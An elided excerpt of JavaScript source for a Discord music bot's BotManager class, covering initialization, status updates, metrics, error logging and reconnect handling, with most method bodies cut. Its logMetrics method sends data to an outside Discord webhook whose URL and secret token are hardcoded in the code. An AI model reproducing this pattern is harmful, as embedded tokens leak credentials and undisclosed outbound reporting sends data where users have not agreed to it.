...
class BotManager {
  ...
  async initialize() {
    try {
      ...
      await this.lis();
      console.log(
        `[Synth Music] Initialized successfully on cluster ${this.client.cluster.id}`
      );
    } catch (error) {
      console.error("[Synth Music] Initialization error:", error);
    ...
    try {
      ...
      const interval = setInterval(async () => {
        try {
          ...
          console.error("[Synth Music] Status update error:", error);
        }
      }, this.statusInterval);
      this.intervals.add(interval);
    } catch (error) {
      console.error("[Synth Music] Status initialization error:", error);
    }
  }
  async met() {
    try {
      ...
      console.error("[Synth Music] Metrics collection error:", error);
    }
  }
  async tezz() {
    try {
  ...
  async logMetrics(metrics) {
    ...
    try {
      const web = `https://canary.discord.com/api/webhooks/1376529232141746186/olDbXTk-6ilz3T1K7RJTgg_OJeJTI_MbYyHaf6RXtbt9X-VGYQ4vYKkbG2DtWlW3wr86`;
      const webhook = new WebhookClient({ url: web });
      webhook.send({ embeds: [embed] });
    } catch (error) {
      console.error(
        "[Synth Music] Error sending metrics to log channel:",
        error
      );
    }
  }
  async clusterEval(fn) {
    try {
      ...
      console.error("[Synth Music] Cluster evaluation error:", error);
      return 0;
    }
  }
  async lis() {
  ...
  async handleGuildUpdate() {
    try {
      ...
      console.error("[Synth Music] Guild update handler error:", error);
    }
  }
  async handleError(error) {
    console.error("[Synth Music] Client error:", error);
    try {
      const logChannel = await this.getLogChannel();
      if (logChannel) {
        const errorEmbed = new EmbedBuilder()
          .setTitle("Synth Music Error")
          .setColor("Red")
      ...
      console.error("[Synth Music] Error logging error:", logError);
    }
  }
  async handleDisconnect(event) {
    console.log(
      "[Synth Music] Disconnected from Discord. Attempting to reconnect."
    );
    try {
      ...
      console.error("[Synth Music] Disconnect handler error:", error);
    }
  }
  formatBytes(bytes) {
